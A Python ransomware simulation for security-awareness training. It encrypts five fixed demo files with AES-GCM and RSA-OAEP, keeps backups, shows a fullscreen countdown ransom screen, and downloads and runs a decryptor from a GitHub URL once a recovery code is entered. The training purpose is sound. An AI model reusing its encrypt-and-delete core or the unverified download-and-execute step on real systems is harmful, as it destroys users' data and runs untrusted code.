from pathlib import Path
from datetime import datetime, timedelta

import hashlib
import json
import os
import shutil
import subprocess
import sys
import time
import tkinter as tk

from urllib.request import Request, urlopen

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes

try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False


# ============================================================
# CONTROLLED SECURITY AWARENESS LAB
#
# Only these exact files are processed:
#
# ~/Desktop/RansomDemo/targets/
#
# No recursive filesystem scanning.
# No persistence.
# No network-share access.
# ============================================================


ROOT = Path.home() / "Desktop" / "RansomDemo"

TARGET_DIR = ROOT / "targets"
BACKUP_DIR = ROOT / ".safety_backup"
RUNTIME_DIR = ROOT / ".runtime"

LOG_FILE = ROOT / "demo_log.txt"
CHECKSUM_FILE = ROOT / "checksums.json"

PRIVATE_KEY_FILE = RUNTIME_DIR / "private.pem"
PUBLIC_KEY_FILE = RUNTIME_DIR / "public.pem"

DECRYPTOR_FILE = RUNTIME_DIR / "demo_decrypt.py"
MASCOT_IMAGE_FILE = RUNTIME_DIR / "unt_mascot.png"


# ============================================================
# GITHUB RAW
# ============================================================


BASE_RAW = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/"
)

DECRYPTOR_URL = (
    BASE_RAW
    + "demo_decrypt.py"
)

RECOVERY_CODE_URL = (
    BASE_RAW
    + "recovery_code.txt"
)

MASCOT_IMAGE_URL = (
    BASE_RAW
    + "unt_mascot.png"
)


# ============================================================
# EXACT TRAINING FILES
# ============================================================


TARGET_FILES = [
    "personal_notes.txt",
    "employees.csv",
    "config.json",
    "project_plan.md",
    "application.log",
]


MAGIC = b"UNTDEMO1"

COUNTDOWN_MINUTES = 30


# ============================================================
# UI COLORS
# ============================================================


BG = "#8b0000"
PANEL = "#171717"

WHITE = "#ffffff"
YELLOW = "#ffe600"
GRAY = "#bbbbbb"


# ============================================================
# LOGGING
# ============================================================


def write_log(message):

    ROOT.mkdir(
        parents=True,
        exist_ok=True
    )

    timestamp = datetime.now().strftime(
        "%Y-%m-%d %H:%M:%S"
    )

    line = (
        f"{timestamp} "
        f"{message}"
    )

    print(line)

    with LOG_FILE.open(
        "a",
        encoding="utf-8"
    ) as file:

        file.write(
            line + "\n"
        )


# ============================================================
# SHA-256
# ============================================================


def sha256_file(path):

    digest = hashlib.sha256()

    with path.open("rb") as file:

        while True:

            chunk = file.read(
                1024 * 1024
            )

            if not chunk:
                break

            digest.update(
                chunk
            )

    return digest.hexdigest()


# ============================================================
# DIRECTORY SETUP
# ============================================================


def setup():

    TARGET_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    BACKUP_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    RUNTIME_DIR.mkdir(
        parents=True,
        exist_ok=True
    )


# ============================================================
# RSA KEY GENERATION
# ============================================================


def generate_keys():

    if PRIVATE_KEY_FILE.exists():

        private_key = RSA.import_key(
            PRIVATE_KEY_FILE.read_bytes()
        )

        if not PUBLIC_KEY_FILE.exists():

            PUBLIC_KEY_FILE.write_bytes(
                private_key
                .publickey()
                .export_key()
            )

        write_log(
            "[KEY] Existing RSA key pair loaded"
        )

        return


    write_log(
        "[KEY] Generating RSA-2048 training key pair"
    )


    key = RSA.generate(
        2048
    )


    PRIVATE_KEY_FILE.write_bytes(
        key.export_key()
    )


    PUBLIC_KEY_FILE.write_bytes(
        key
        .publickey()
        .export_key()
    )


    try:

        os.chmod(
            PRIVATE_KEY_FILE,
            0o600
        )

    except OSError:

        pass


    write_log(
        "[KEY] RSA key pair generated"
    )


# ============================================================
# ORIGINAL SHA-256 BASELINE
# ============================================================


def save_original_checksums():

    checksums = {}


    for filename in TARGET_FILES:

        path = (
            TARGET_DIR
            / filename
        )


        if not path.exists():

            write_log(
                "[HASH-ERROR] "
                f"Missing source file: {filename}"
            )

            continue


        if path.is_symlink():

            write_log(
                "[HASH-ERROR] "
                f"Symlink rejected: {filename}"
            )

            continue


        digest = sha256_file(
            path
        )


        checksums[
            filename
        ] = digest


        write_log(
            "[HASH-BEFORE] "
            f"{filename} "
            f"{digest}"
        )


    CHECKSUM_FILE.write_text(
        json.dumps(
            checksums,
            indent=2
        ),
        encoding="utf-8"
    )


    write_log(
        "[HASH] SHA-256 baseline saved"
    )


# ============================================================
# ENCRYPT ONE FILE
# ============================================================


def encrypt_file(filename):

    source = (
        TARGET_DIR
        / filename
    )

    encrypted = (
        TARGET_DIR
        / (filename + ".unt")
    )

    backup = (
        BACKUP_DIR
        / filename
    )

    temporary = (
        TARGET_DIR
        / (filename + ".unt.tmp")
    )


    # --------------------------------------------------------
    # SAFETY VALIDATION
    # --------------------------------------------------------


    if source.is_symlink():

        write_log(
            "[SKIP] "
            f"Symlink rejected: {filename}"
        )

        return False


    if not source.exists():

        if encrypted.exists():

            write_log(
                "[INFO] "
                f"Already encrypted: {filename}"
            )

            return True


        write_log(
            "[ERROR] "
            f"Source file missing: {filename}"
        )

        return False


    if encrypted.exists():

        write_log(
            "[ERROR] "
            f"Original and encrypted file both exist: "
            f"{filename}"
        )

        return False


    # --------------------------------------------------------
    # SAFETY BACKUP
    # --------------------------------------------------------


    if not backup.exists():

        shutil.copy2(
            source,
            backup
        )

        write_log(
            "[BACKUP] "
            f"{filename}"
        )


    plaintext = source.read_bytes()


    # --------------------------------------------------------
    # RANDOM AES-256 KEY
    # --------------------------------------------------------


    aes_key = get_random_bytes(
        32
    )


    # --------------------------------------------------------
    # AES-256-GCM
    # --------------------------------------------------------


    aes_cipher = AES.new(
        aes_key,
        AES.MODE_GCM
    )


    ciphertext, tag = (
        aes_cipher.encrypt_and_digest(
            plaintext
        )
    )


    # --------------------------------------------------------
    # RSA-OAEP
    # --------------------------------------------------------


    public_key = RSA.import_key(
        PUBLIC_KEY_FILE.read_bytes()
    )


    rsa_cipher = PKCS1_OAEP.new(
        public_key,
        hashAlgo=SHA256
    )


    encrypted_aes_key = (
        rsa_cipher.encrypt(
            aes_key
        )
    )


    try:

        with temporary.open(
            "wb"
        ) as file:


            file.write(
                MAGIC
            )


            file.write(
                len(
                    encrypted_aes_key
                ).to_bytes(
                    2,
                    "big"
                )
            )


            file.write(
                encrypted_aes_key
            )


            file.write(
                len(
                    aes_cipher.nonce
                ).to_bytes(
                    1,
                    "big"
                )
            )


            file.write(
                aes_cipher.nonce
            )


            file.write(
                len(tag).to_bytes(
                    1,
                    "big"
                )
            )


            file.write(
                tag
            )


            file.write(
                ciphertext
            )


        os.replace(
            temporary,
            encrypted
        )


        source.unlink()


        write_log(
            "[ENCRYPTED] "
            f"{filename} -> "
            f"{filename}.unt"
        )


        return True


    except Exception as error:


        if temporary.exists():

            temporary.unlink()


        write_log(
            "[ENCRYPT-FAILED] "
            f"{filename}: {error}"
        )


        return False


# ============================================================
# ENCRYPT ALL
# ============================================================


def encrypt_all():

    successful = 0


    for filename in TARGET_FILES:

        if encrypt_file(
            filename
        ):

            successful += 1


    return successful


# ============================================================
# VERIFY ENCRYPTION
# ============================================================


def verify_encrypted_state():

    for filename in TARGET_FILES:

        plaintext = (
            TARGET_DIR
            / filename
        )

        encrypted = (
            TARGET_DIR
            / (filename + ".unt")
        )


        if plaintext.exists():

            write_log(
                "[VERIFY-ERROR] "
                f"Plaintext remains: {filename}"
            )

            return False


        if not encrypted.exists():

            write_log(
                "[VERIFY-ERROR] "
                f"Encrypted file missing: "
                f"{filename}.unt"
            )

            return False


    write_log(
        "[VERIFY] "
        "All 5 training files encrypted"
    )


    return True


# ============================================================
# HTTP DOWNLOAD HELPER
# ============================================================


def download_url(
    url,
    timeout=15
):

    final_url = (
        url
        + "?t="
        + str(
            int(
                time.time()
            )
        )
    )


    request = Request(
        final_url,
        headers={
            "User-Agent":
                "Security-Awareness-Lab/1.0",

            "Cache-Control":
                "no-cache",

            "Pragma":
                "no-cache",
        }
    )


    with urlopen(
        request,
        timeout=timeout
    ) as response:

        return response.read()


# ============================================================
# REMOTE RECOVERY CODE
# ============================================================


def get_remote_recovery_code():

    raw = download_url(
        RECOVERY_CODE_URL,
        timeout=10
    )


    code = (
        raw
        .decode(
            "utf-8"
        )
        .strip()
    )


    if not code:

        raise RuntimeError(
            "Remote recovery code is empty"
        )


    if len(code) > 64:

        raise RuntimeError(
            "Remote recovery code is invalid"
        )


    write_log(
        "[RECOVERY] "
        "Remote recovery code retrieved"
    )


    return code


# ============================================================
# DOWNLOAD DECRYPTOR
# ============================================================


def download_decryptor():

    write_log(
        "[RECOVERY] "
        "Downloading recovery utility"
    )


    data = download_url(
        DECRYPTOR_URL,
        timeout=15
    )


    if len(data) < 100:

        raise RuntimeError(
            "Recovery utility download failed"
        )


    temporary = (
        RUNTIME_DIR
        / "demo_decrypt.py.tmp"
    )


    temporary.write_bytes(
        data
    )


    os.replace(
        temporary,
        DECRYPTOR_FILE
    )


    write_log(
        "[RECOVERY] "
        "Recovery utility downloaded"
    )


# ============================================================
# DOWNLOAD MASCOT
# ============================================================


def download_mascot_image():

    try:

        write_log(
            "[GUI] "
            "Downloading mascot image"
        )


        data = download_url(
            MASCOT_IMAGE_URL,
            timeout=15
        )


        if len(data) < 500:

            raise RuntimeError(
                "Mascot image download failed"
            )


        temporary = (
            RUNTIME_DIR
            / "unt_mascot.png.tmp"
        )


        temporary.write_bytes(
            data
        )


        os.replace(
            temporary,
            MASCOT_IMAGE_FILE
        )


        write_log(
            "[GUI] "
            "Mascot image downloaded"
        )


        return True


    except Exception as error:

        write_log(
            "[GUI-WARNING] "
            f"Mascot download failed: {error}"
        )


        return False


# ============================================================
# LOAD MASCOT
# ============================================================


def load_mascot_photo():

    if not PIL_AVAILABLE:

        write_log(
            "[GUI-WARNING] "
            "Pillow not available"
        )

        return None


    if not MASCOT_IMAGE_FILE.exists():

        return None


    try:

        image = Image.open(
            MASCOT_IMAGE_FILE
        ).convert(
            "RGBA"
        )


        pixels = []


        for red, green, blue, alpha in image.getdata():


            if (
                red < 40
                and
                green < 40
                and
                blue < 40
            ):

                pixels.append(
                    (0, 0, 0, 0)
                )


            else:

                pixels.append(
                    (
                        red,
                        green,
                        blue,
                        alpha
                    )
                )


        image.putdata(
            pixels
        )


        bbox = image.getbbox()


        if bbox:

            image = image.crop(
                bbox
            )


        image.thumbnail(
            (500, 680)
        )


        return ImageTk.PhotoImage(
            image
        )


    except Exception as error:

        write_log(
            "[GUI-WARNING] "
            f"Mascot processing failed: {error}"
        )


        return None


# ============================================================
# GUI
# ============================================================


def show_warning_window():

    root = tk.Tk()


    root.title(
        "Ransomware Simulation"
    )


    root.configure(
        bg=BG
    )


    root.attributes(
        "-fullscreen",
        True
    )


    root.attributes(
        "-topmost",
        True
    )


    root.bind(
        "<Escape>",
        lambda event:
            root.destroy()
    )


    end_time = (
        datetime.now()
        + timedelta(
            minutes=COUNTDOWN_MINUTES
        )
    )


    # ========================================================
    # MAIN CONTAINER
    # ========================================================


    main_frame = tk.Frame(
        root,
        bg=BG
    )


    # Slightly below screen center.
    main_frame.place(
        relx=0.5,
        rely=0.53,
        anchor="center"
    )


    # ========================================================
    # LEFT SIDE - MASCOT
    # ========================================================


    left_frame = tk.Frame(
        main_frame,
        bg=BG
    )


    left_frame.grid(
        row=0,
        column=0,
        padx=(20, 65),
        sticky="n"
    )


    mascot_photo = (
        load_mascot_photo()
    )


    if mascot_photo is not None:


        mascot = tk.Label(
            left_frame,
            image=mascot_photo,
            bg=BG,
            borderwidth=0
        )


        mascot.image = (
            mascot_photo
        )


        mascot.pack(
            pady=(35, 0)
        )


    else:


        fallback = tk.Label(
            left_frame,
            text="UNT",
            font=(
                "Arial",
                90,
                "bold"
            ),
            fg=WHITE,
            bg=BG
        )


        fallback.pack(
            pady=(150, 0)
        )


    # ========================================================
    # RIGHT SIDE
    # ========================================================


    right_frame = tk.Frame(
        main_frame,
        bg=BG
    )


    right_frame.grid(
        row=0,
        column=1,
        sticky="n"
    )


    # ========================================================
    # TITLE
    # ========================================================


    title = tk.Label(
        right_frame,
        text="RANSOMWARE INFECTION",
        font=(
            "Arial",
            40,
            "bold"
        ),
        fg=WHITE,
        bg=BG
    )


    title.pack(
        pady=(10, 8)
    )


    encrypted_message = tk.Label(
        right_frame,
        text="YOUR FILES HAVE BEEN ENCRYPTED",
        font=(
            "Arial",
            22,
            "bold"
        ),
        fg=YELLOW,
        bg=BG
    )


    encrypted_message.pack(
        pady=4
    )


    test_notice = tk.Label(
        right_frame,
        text="THIS IS A TEST.",
        font=(
            "Arial",
            13
        ),
        fg=WHITE,
        bg=BG
    )


    test_notice.pack(
        pady=(3, 25)
    )


    # ========================================================
    # COUNTDOWN BOX
    # ========================================================


    timer_panel = tk.Frame(
        right_frame,
        bg=PANEL,
        padx=45,
        pady=15,
        highlightbackground="#555555",
        highlightthickness=1
    )


    timer_panel.pack(
        pady=(5, 20)
    )


    timer_label = tk.Label(
        timer_panel,
        text="00:30:00",
        font=(
            "Courier",
            50,
            "bold"
        ),
        fg=YELLOW,
        bg=PANEL
    )


    timer_label.pack()


    # ========================================================
    # VIEW FILES
    # ========================================================


    def view_files():

        write_log(
            "[GUI] "
            "Encrypted directory opened"
        )


        root.attributes(
            "-topmost",
            False
        )


        try:

            subprocess.Popen(
                [
                    "xdg-open",
                    str(
                        TARGET_DIR
                    )
                ]
            )


        except Exception as error:

            write_log(
                f"[GUI-ERROR] {error}"
            )


    view_button = tk.Button(
        right_frame,
        text="VIEW ENCRYPTED FILES",
        font=(
            "Arial",
            14,
            "bold"
        ),
        command=view_files,
        fg="#111111",
        bg="#eeeeee",
        activeforeground="#111111",
        activebackground="#dddddd",
        relief="solid",
        borderwidth=1,
        padx=25,
        pady=7,
        cursor="hand2"
    )


    view_button.pack(
        pady=(0, 15)
    )


    # ========================================================
    # RECOVERY CODE
    # ========================================================


    code_label = tk.Label(
        right_frame,
        text="RECOVERY CODE",
        font=(
            "Arial",
            14,
            "bold"
        ),
        fg=WHITE,
        bg=BG
    )


    code_label.pack(
        pady=(5, 5)
    )


    code_entry = tk.Entry(
        right_frame,
        font=(
            "Courier",
            21,
            "bold"
        ),
        width=18,
        justify="center",
        show="*",
        fg=WHITE,
        bg="#050505",
        insertbackground=WHITE,
        relief="solid",
        borderwidth=2
    )


    code_entry.pack(
        ipady=7,
        pady=3
    )


    code_entry.focus_set()


    status_label = tk.Label(
        right_frame,
        text="",
        font=(
            "Arial",
            12,
            "bold"
        ),
        fg=YELLOW,
        bg=BG
    )


    status_label.pack(
        pady=7
    )


    # ========================================================
    # RECOVERY LOGIC
    # ========================================================


    def recover():

        entered_code = (
            code_entry
            .get()
            .strip()
        )


        if not entered_code:

            status_label.config(
                text="ENTER A RECOVERY CODE"
            )

            return


        status_label.config(
            text="VALIDATING RECOVERY CODE..."
        )


        root.update_idletasks()


        write_log(
            "[RECOVERY] "
            "Code validation requested"
        )


        try:

            remote_code = (
                get_remote_recovery_code()
            )


        except Exception as error:


            write_log(
                "[RECOVERY-ERROR] "
                f"Validation failed: {error}"
            )


            status_label.config(
                text=(
                    "UNABLE TO CONTACT "
                    "RECOVERY SERVER"
                )
            )


            return


        if entered_code != remote_code:


            write_log(
                "[RECOVERY] "
                "Invalid recovery code"
            )


            status_label.config(
                text="INVALID RECOVERY CODE"
            )


            code_entry.delete(
                0,
                tk.END
            )


            return


        write_log(
            "[RECOVERY] "
            "Remote recovery code validated"
        )


        status_label.config(
            text="RECOVERY CODE ACCEPTED"
        )


        root.update_idletasks()


        try:

            status_label.config(
                text=(
                    "DOWNLOADING "
                    "RECOVERY UTILITY..."
                )
            )


            root.update_idletasks()


            download_decryptor()


            status_label.config(
                text="STARTING FILE RECOVERY..."
            )


            root.update_idletasks()


            subprocess.Popen(
                [
                    sys.executable,
                    str(
                        DECRYPTOR_FILE
                    )
                ]
            )


            write_log(
                "[RECOVERY] "
                "Recovery utility launched"
            )


            root.destroy()


        except Exception as error:


            write_log(
                "[RECOVERY-ERROR] "
                f"{error}"
            )


            status_label.config(
                text=(
                    "RECOVERY FAILED: "
                    + str(error)
                )
            )


    # ========================================================
    # RECOVER BUTTON
    # ========================================================


    recover_button = tk.Button(
        right_frame,
        text="RECOVER FILES",
        font=(
            "Arial",
            15,
            "bold"
        ),
        command=recover,
        fg="#111111",
        bg="#eeeeee",
        activeforeground="#111111",
        activebackground="#dddddd",
        relief="solid",
        borderwidth=1,
        padx=30,
        pady=8,
        cursor="hand2"
    )


    recover_button.pack(
        pady=(5, 0)
    )


    code_entry.bind(
        "<Return>",
        lambda event:
            recover()
    )


    # ========================================================
    # FOOTER
    # ========================================================


    footer = tk.Label(
        root,
        text=(
            "SIMULATION ONLY"
            "   •   "
            "ESC = Emergency Exit"
        ),
        font=(
            "Arial",
            12
        ),
        fg=WHITE,
        bg=BG
    )


    footer.pack(
        side="bottom",
        pady=18
    )


    # ========================================================
    # COUNTDOWN
    # ========================================================


    def update_timer():

        remaining = (
            end_time
            - datetime.now()
        )


        seconds = max(
            0,
            int(
                remaining.total_seconds()
            )
        )


        hours = (
            seconds // 3600
        )


        minutes = (
            seconds % 3600
        ) // 60


        secs = (
            seconds % 60
        )


        timer_label.config(
            text=(
                f"{hours:02d}:"
                f"{minutes:02d}:"
                f"{secs:02d}"
            )
        )


        if seconds > 0:

            root.after(
                1000,
                update_timer
            )


        else:

            status_label.config(
                text="TRAINING TIMER EXPIRED"
            )


            write_log(
                "[GUI] "
                "Countdown expired"
            )


    update_timer()


    write_log(
        "[GUI] "
        "Warning screen displayed"
    )


    root.mainloop()


# ============================================================
# MAIN
# ============================================================


def main():

    setup()


    write_log(
        "=================================================="
    )


    write_log(
        "[START] "
        "Security-awareness simulation started"
    )


    # --------------------------------------------------------
    # CHECK EXPECTED TRAINING FILES
    # --------------------------------------------------------


    missing = []


    for filename in TARGET_FILES:

        plaintext = (
            TARGET_DIR
            / filename
        )

        encrypted = (
            TARGET_DIR
            / (filename + ".unt")
        )


        if (
            not plaintext.exists()
            and
            not encrypted.exists()
        ):

            missing.append(
                filename
            )


    if missing:


        write_log(
            "[ABORT] "
            "Missing training files: "
            + ", ".join(
                missing
            )
        )


        print(
            "\nRequired demo files are missing:"
        )


        for filename in missing:

            print(
                f" - {filename}"
            )


        return


    # --------------------------------------------------------
    # RSA
    # --------------------------------------------------------


    generate_keys()


    # --------------------------------------------------------
    # SHA-256 BASELINE
    # --------------------------------------------------------


    plaintext_count = sum(

        1

        for filename
        in TARGET_FILES

        if (
            TARGET_DIR
            / filename
        ).exists()

    )


    if plaintext_count > 0:

        save_original_checksums()


    # --------------------------------------------------------
    # ENCRYPT
    # --------------------------------------------------------


    successful = (
        encrypt_all()
    )


    write_log(
        "[STATUS] "
        f"Encryption: "
        f"{successful}/"
        f"{len(TARGET_FILES)}"
    )


    # --------------------------------------------------------
    # VERIFY
    # --------------------------------------------------------


    if not verify_encrypted_state():


        write_log(
            "[ABORT] "
            "Encrypted-state verification failed"
        )


        print(
            "\nNot all demo files "
            "were encrypted."
        )


        print(
            "GUI will not be displayed."
        )


        return


    # --------------------------------------------------------
    # VISUAL ASSET
    # --------------------------------------------------------


    download_mascot_image()


    # --------------------------------------------------------
    # GUI
    # --------------------------------------------------------


    show_warning_window()


if __name__ == "__main__":

    main()
